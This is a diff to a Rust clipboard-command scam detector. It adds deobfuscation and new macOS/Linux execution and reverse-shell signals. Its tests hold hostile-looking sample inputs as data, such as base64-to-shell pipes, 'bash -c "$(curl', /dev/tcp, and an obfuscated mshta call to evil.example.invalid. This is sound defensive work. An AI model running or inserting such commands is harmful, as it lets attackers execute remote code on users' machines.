@@ -1,13 +1,20 @@
 //! Verdict for command text (legacy `CommandDetector.Analyze`,
-//! docs/spec/detection-rules.md §3.0–3.2).
+//! docs/spec/detection-rules.md §3.0–3.2, §3.5).
 //!
 //! Execution signal only → Suspicious (official installers look like this too);
 //! execution signal + any strong scam signal → Malicious. Download-and-execute is
-//! itself an execution signal, and a strong one unless every source host is an
-//! official installer host (#20).
+//! itself an execution signal, and a strong one unless every source is an
+//! official installer host or URL prefix (#20).
+//!
+//! 1b: every segment is also deobfuscated ([`super::deobfuscate`]) and the peeled
+//! text is judged by the same table; the higher level wins and the reasons are
+//! merged. Text that went through a built step never qualifies for the official
+//! lists, and an execution signal that only appears after an obfuscation step adds
+//! the strong signal `cmd-reason-obfuscated`.
 
 use crate::{Level, Message, Verdict};
 
+use super::deobfuscate::{self, RawStep, StepKind};
 use super::re::Signal;
 use super::{download_exec, normalize, signals};
 
@@ -27,13 +34,18 @@ pub const MAX_LINES: usize = 4000;
 /// Long texts keep at most this many consecutive whitespace chars per line (must
 /// stay above the "30 spaces then #" threshold).
 pub const MAX_WHITESPACE_RUN: usize = 64;
+/// At most this many download hosts are reported in a finding.
+pub const MAX_FINDING_HOSTS: usize = 16;
 
 const REASON_DOWNLOAD_EXEC: &str = "cmd-reason-download-exec";
 const REASON_UNOFFICIAL_SOURCE: &str = "cmd-reason-unofficial-source";
+const REASON_NET_USE: &str = "cmd-reason-net-use";
+/// Strong: an execution signal that only shows after deobfuscation.
+pub(crate) const REASON_OBFUSCATED: &str = "cmd-reason-obfuscated";
 /// Weak scam signals: official installers also download and iex.
-const WEAK: [&str; 2] = ["cmd-reason-download", "cmd-reason-iex"];
+pub(crate) const WEAK: [&str; 2] = ["cmd-reason-download", "cmd-reason-iex"];
 
-const EXECUTION_SIGNALS: [Signal; 22] = [
+const EXECUTION_SIGNALS: [Signal; 26] = [
     (signals::powershell, "cmd-reason-powershell"),
     (signals::mshta_invocation, "cmd-reason-mshta"),
     (signals::cmd, "cmd-reason-cmd"),
@@ -56,9 +68,14 @@ const EXECUTION_SIGNALS: [Signal; 22] = [
     (signals::webdav, "cmd-reason-webdav"),
     (signals::search_ms, "cmd-reason-search-ms"),
     (signals::ms_msdt, "cmd-reason-ms-msdt"),
+    // 1b: macOS / Linux
+    (signals::osascript, "cmd-reason-osascript"),
+    (signals::quarantine, "cmd-reason-quarantine"),
+    (signals::decode_shell, "cmd-reason-decode-shell"),
+    (signals::dev_tcp, "cmd-reason-dev-tcp"),
 ];
 
-const SCAM_SIGNALS: [Signal; 8] = [
+const SCAM_SIGNALS: [Signal; 13] = [
     (signals::hidden_window, "cmd-reason-hidden-window"),
     (signals::encoded, "cmd-reason-encoded"),
     (signals::iex, "cmd-reason-iex"),
@@ -67,41 +84,94 @@ const SCAM_SIGNALS: [Signal; 8] = [
     (signals::check_mark, "cmd-reason-check-mark"),
     (signals::padding, "cmd-reason-padding"),
     (signals::mshta_remote, "cmd-reason-mshta-remote"),
+    // 1b
+    (signals::hidden_window_api, "cmd-reason-hidden-window"),
+    (signals::decode_shell, "cmd-reason-encoded"),
+    (signals::reverse_shell, "cmd-reason-reverse-shell"),
+    (signals::background, "cmd-reason-background"),
+    (signals::msiexec_quiet, "cmd-reason-msiexec-quiet"),
 ];
 
-/// Analyzes clipboard text (legacy `CommandDetector.Analyze`).
+/// Is `id` an execution-signal reason?
+pub(crate) fn is_execution_id(id: &str) -> bool {
+    id == REASON_DOWNLOAD_EXEC
+        || id == REASON_NET_USE
+        || EXECUTION_SIGNALS.iter().any(|(_, e)| *e == id)
+}
+
+/// Is `id` a strong scam reason?
+pub(crate) fn is_strong_id(id: &str) -> bool {
+    !is_execution_id(id) && !WEAK.contains(&id)
+}
+
+/// Analyzes clipboard text (legacy `CommandDetector.Analyze`, plus the 1b
+/// deobfuscation). Same as `analyze_in(text, &Context::default()).verdict`.
 pub fn analyze(text: &str) -> Verdict {
+    analysis(text, false).verdict
+}
+
+/// Everything the analysis found: verdict, deobfuscation steps (only when
+/// `collect`), download hosts (only when `collect`), and how many distinct
+/// obfuscation step kinds were seen.
+#[derive(Debug, Clone, Default)]
+pub(crate) struct Analysis {
+    pub verdict: Verdict,
+    pub steps: Vec<RawStep>,
+    pub hosts: Vec<String>,
+    pub obfuscation_kinds: Vec<StepKind>,
+}
+
+impl Analysis {
+    fn merge(&mut self, other: Analysis) {
+        if other.verdict.level != Level::None {
+            self.verdict.level = self.verdict.level.max(other.verdict.level);
+            push_unique(&mut self.verdict.reasons, other.verdict.reasons);
+        }
+        for s in other.steps {
+            if self.steps.len() < deobfuscate::MAX_STEPS {
+                self.steps.push(s);
+            }
+        }
+        for h in other.hosts {
+            if self.hosts.len() < MAX_FINDING_HOSTS && !self.hosts.contains(&h) {
+                self.hosts.push(h);
+            }
+        }
+        for k in other.obfuscation_kinds {
+            if !self.obfuscation_kinds.contains(&k) {
+                self.obfuscation_kinds.push(k);
+            }
+        }
+    }
+}
+
+fn push_unique(into: &mut Vec<Message>, from: Vec<Message>) {
+    for r in from {
+        if !into.contains(&r) {
+            into.push(r);
+        }
+    }
+}
+
+/// Analyzes `text`, segment by segment for long texts (§3.0).
+pub(crate) fn analysis(text: &str, collect: bool) -> Analysis {
     if text.trim().is_empty() {
-        return Verdict::CLEAN;
+        return Analysis::default();
     }
     if fits_window(text) {
-        return analyze_segment(text);
+        return analyze_segment(text, collect);
     }
     // Padding is mostly whitespace: shorten long runs first so spaces cannot push
     // a command out of the analyzed range (#19).
     let text = collapse_long_whitespace(text);
     if fits_window(&text) {
-        return analyze_segment(&text);
+        return analyze_segment(&text, collect);
     }
-    let mut level = Level::None;
-    let mut reasons: Vec<Message> = Vec::new();
+    let mut all = Analysis::default();
     for segment in segments(&text) {
-        let v = analyze_segment(segment);
-        if v.level == Level::None {
-            continue;
-        }
-        level = level.max(v.level);
-        for r in v.reasons {
-            if !reasons.contains(&r) {
-                reasons.push(r);
-            }
-        }
+        all.merge(analyze_segment(segment, collect));
     }
-    if level == Level::None {
-        Verdict::CLEAN
-    } else {
-        Verdict { level, reasons }
-    }
+    all
 }
 
 fn fits_window(text: &str) -> bool {
@@ -172,23 +242,25 @@ pub(crate) fn segments(text: &str) -> Vec<&str> {
 }
 
 fn matches(rules: &[Signal], text: &str) -> Vec<Message> {
-    rules
-        .iter()
-        .filter(|(re, _)| re().is_match(text))
-        .map(|(_, id)| Message::new(id))
-        .collect()
+    let mut out: Vec<Message> = Vec::new();
+    for (re, id) in rules {
+        if re().is_match(text) && !out.iter().any(|m| m.id == *id) {
+            out.push(Message::new(id));
+        }
+    }
+    out
 }
 
-fn analyze_segment(raw: &str) -> Verdict {
-    let text = normalize(raw);
-
-    let mut execution = matches(&EXECUTION_SIGNALS, &text);
-    if signals::net_use_then_run(&text) {
-        execution.push(Message::new("cmd-reason-net-use"));
+/// The decision table (§3.2) on normalized text. `allow_official`: the official
+/// installer lists may lower download-and-execute to Suspicious.
+fn evaluate(text: &str, allow_official: bool) -> Verdict {
+    let mut execution = matches(&EXECUTION_SIGNALS, text);
+    if signals::net_use_then_run(text) {
+        execution.push(Message::new(REASON_NET_USE));
     }
     // Download-and-execute is an execution signal by itself: `irm get.scoop.sh | iex`
     // names no program but runs when pasted into PowerShell.
-    let download_exec = download_exec::is_match(&text);
+    let download_exec = download_exec::is_match(text);
     if download_exec {
         execution.push(Message::new(REASON_DOWNLOAD_EXEC));
     }
@@ -196,8 +268,8 @@ fn analyze_segment(raw: &str) -> Verdict {
         return Verdict::CLEAN;
     }
 
-    let mut scam = matches(&SCAM_SIGNALS, &text);
-    if download_exec && !download_exec::is_from_official_source(&text) {
+    let mut scam = matches(&SCAM_SIGNALS, text);
+    if download_exec && !(allow_official && download_exec::is_from_official_source(text)) {
         scam.push(Message::new(REASON_UNOFFICIAL_SOURCE));
     }
     let strong = scam.iter().any(|m| !WEAK.contains(&m.id.as_ref()));
@@ -206,10 +278,71 @@ fn analyze_segment(raw: &str) -> Verdict {
     } else {
         Level::Suspicious
     };
-    execution.extend(scam);
+    push_unique(&mut execution, scam);
     Verdict {
         level,
         reasons: execution,
+    }
+}
+
+fn execution_ids(v: &Verdict) -> impl Iterator<Item = &str> {
+    v.reasons
+        .iter()
+        .map(|m| m.id.as_ref())
+        .filter(|id| is_execution_id(id))
+}
+
+fn analyze_segment(raw: &str, collect: bool) -> Analysis {
+    let run = deobfuscate::run(raw);
+    // Layer 0 of the run is exactly the legacy normalization (unless a size cap
+    // stopped it).
+    let normalized = run.normalized.clone().unwrap_or_else(|| normalize(raw));
+    let mut verdict = evaluate(&normalized, true);
+    let mut hosts = if collect {
+        download_exec::hosts(&normalized)
+    } else {
+        Vec::new()
+    };
+
+    if run.output != run.plain {
+        let deob = evaluate(&run.output, !run.built);
+        let mut hidden: Vec<&str> = execution_ids(&deob)
+            .filter(|id| !execution_ids(&verdict).any(|b| b == *id))
+            .collect();
+        if run.obfuscated && !hidden.is_empty() && run.plain != normalized {
+            // Markdown markers alone do not hide anything.
+            let plain = evaluate(&run.plain, true);
+            hidden.retain(|id| !execution_ids(&plain).any(|b| b == *id));
+        }
+        let obfuscated = run.obfuscated && !hidden.is_empty();
+        if deob.level != Level::None {
+            verdict.level = verdict.level.max(deob.level);
+            push_unique(&mut verdict.reasons, deob.reasons);
+        }
+        if obfuscated {
+            verdict.level = Level::Malicious;
+            push_unique(&mut verdict.reasons, vec![Message::new(REASON_OBFUSCATED)]);
+        }
+        if collect {
+            for h in download_exec::hosts(&run.output) {
+                if !hosts.contains(&h) {
+                    hosts.push(h);
+                }
+            }
+        }
+    }
+    hosts.truncate(MAX_FINDING_HOSTS);
+    let mut obfuscation_kinds: Vec<StepKind> = Vec::new();
+    for s in &run.steps {
+        if s.kind.is_obfuscation() && !obfuscation_kinds.contains(&s.kind) {
+            obfuscation_kinds.push(s.kind);
+        }
+    }
+    Analysis {
+        verdict,
+        steps: if collect { run.steps } else { Vec::new() },
+        hosts,
+        obfuscation_kinds,
     }
 }
 
@@ -295,5 +428,85 @@ mod tests {
             ["ms", "hta https://evil.example/a"].concat()
         );
         assert_eq!(analyze(&text).level, Level::Malicious);
+    }
+
+    /// Release budget for one 1 Mi-char pathological input (phase-1.md §1.6:
+    /// 150 ms; CI fails at twice the budget).
+    const BUDGET_MS: u128 = 150;
+
+    /// 1b: pathological inputs for every deobfuscation layer and new signal. Each
+    /// is about 1 Mi chars; `analyze_in` (with trace and masking) must stay within
+    /// twice the budget in optimized builds.
+    #[test]
+    fn deobfuscation_inputs_meet_budget() {
+        const N: usize = 1 << 20;
+        let fill = |unit: &str| {
+            let mut s = unit.repeat(N / unit.chars().count().max(1) + 1);
+            let cut = s.char_indices().nth(N).map_or(s.len(), |(i, _)| i);
+            s.truncate(cut);
+            s
+        };
+        let inputs = [
+            fill("'a'+"),
+            fill("'a'+'b' "),
+            fill("[char]65+"),
+            fill("[char[]](65,66) "),
+            fill("-join ('a','b') "),
+            fill("('a','b') -join '' "),
+            fill("'{0}{1}' -f 'a','b' "),
+            fill("'ab' -replace 'a','b' "),
+            fill("'ab'.Replace('a','b') "),
+            fill("[string]::Concat('a','b') "),
+            fill("& ('a') "),
+            fill("(('a')) "),
+            fill("$a='x'; $a "),
+            format!("set x=abcdef&{}", fill("%x:~1,2%")),
+            format!("set x=abcdef&{}", fill("!x:b=c!")),
+            fill("`a"),
+            fill("``a`"),
+            fill("```\n"),
+            fill("%41%42%43 "),
+            fill("\\x41\\x42\\x43 "),
+            fill("41"),
+            fill("\u{FF41}"),
+            fill("x -enc QQBBAEEAQQBBAEEAQQBBAA== "),
+            fill("echo QUFBQUFBQUFBQUFBQUFBQQ== | base64 -d | sh\n"),
+            fill("b64decode('QUFBQUFBQUFBQUFBQUFBQQ==') "),
+            fill(
+                "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QUFBQUFBQUFBQUFB')) ",
+            ),
+            fill("curl -o a x; ./a; "),
+            fill("python3 -c exec(urlopen( "),
+            fill("bash -c \"$(curl "),
+            fill("xattr -c "),
+            fill("nohup /dev/tcp/a/1 "),
+            fill("osascript -e "),
+            fill("https://raw.githubusercontent.com/Homebrew/install/a "),
+        ];
+        let ctx = crate::Context::default();
+        for input in &inputs {
+            let start = std::time::Instant::now();
+            let f = super::super::analyze_in(input, &ctx);
+            let elapsed = start.elapsed();
+            assert!(f.trace.len() <= deobfuscate::MAX_STEPS);
+            if !cfg!(debug_assertions) {
+                assert!(
+                    elapsed.as_millis() < 2 * BUDGET_MS,
+                    "{:?}… took {elapsed:?}",
+                    input.chars().take(24).collect::<String>()
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn deobfuscated_payloads_escalate() {
+        // `& ('ms'+'hta') https://…`: legacy None; the peeled text runs mshta on a
+        // remote URL.
+        let concat = ["& ('m", "s'+'hta') https://evil.example.invalid/a"].concat();
+        assert_eq!(analyze(&concat).level, Level::Malicious);
+        // Markdown fences around an official installer stay Suspicious.
+        let md = "```sh\ncurl -fsSL https://bun.sh/install | bash\n```\nthen `bun upgrade`";
+        assert_eq!(analyze(md).level, Level::Suspicious);
     }
 }
